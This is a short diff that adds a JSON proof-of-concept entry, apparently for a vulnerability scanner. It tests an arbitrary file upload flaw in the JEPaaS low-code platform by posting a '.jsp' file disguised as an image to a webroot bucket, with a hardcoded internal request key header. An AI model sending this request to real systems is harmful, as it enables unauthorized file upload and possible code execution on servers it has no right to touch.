@@ -1,0 +1,19 @@
+{
+	"name":"JEPaaS低代码平台document文件上传",
+	"tag":"jee",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/je/document/file?bucket=webroot",
+		"pocPost":"------21909179191068471382830692394\r\nContent-Disposition: form-data; name=\"files\"; filename=\"2214.jsp\"\r\nContent-Type: image/jpeg\r\n \r\n123\r\n------21909179191068471382830692394--",
+		"header":{
+			"Accept":" application/json, text/javascript, */*; q=0.01",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv",
+			"Connection":" close",
+			"Accept-Language":" zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,",
+			"internalRequestKey":" schedule_898901212",
+			"Content-Type":" multipart/form-data; boundary=----21909179191068471382830692394"
+		},
+		"status_code":"200",
+		"pattern":"(createTime)"
+	}
+}
